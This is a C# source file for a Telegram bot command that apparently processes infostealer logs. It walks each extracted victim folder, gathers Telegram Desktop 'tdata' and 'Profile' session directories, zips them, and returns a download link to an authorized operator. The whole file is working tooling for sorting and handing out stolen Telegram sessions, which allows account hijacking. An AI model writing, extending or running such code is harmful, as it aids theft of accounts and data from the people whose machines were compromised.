using System.Text;
using Core.Models;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TelegramServiceCommand(Client client, DataService data, Random random) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) => client.SendMessageAvailableLogs(user, data, random, "Telegram");

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (update.data.Length == 1)
        {
            await client.SendCallbackAvailableLogs(user, data, update.msg_id, update.data);
            
            return;
        }

        var logsname = Encoding.UTF8.GetString(update.data);
        var logspath = data.GetExtractedPath(logsname);
        var zippath = data.CreateZipPath(logsname, name: "Telegram");

        await client.EditMessageText(user, update.msg_id, $"Telegram\nParsing from {logsname}");

        var zip = new ZipArchive(zippath);

        foreach (var log in Directory.GetDirectories(logspath))
        {
            var telegrampath = Directory.GetDirectories(log, "Telegram", SearchOption.AllDirectories).FirstOrDefault();

            if (telegrampath is null) continue;

            foreach (var tdata in Directory.GetDirectories(telegrampath)
                         .Where(x =>
                         {
                             var name = x[(x.LastIndexOf('\\') + 1)..];
                             return name.StartsWith("Profile") || name.StartsWith("tdata");
                         }))
            {
                await zip.AddDirectoryAsync(tdata);
            }
        }

        await client.Messages_SendMessage(user, $"{logsname}\n{await data.GetShareLinkAsync(zippath)}", random.NextInt64(), clear_draft: true);
    }
}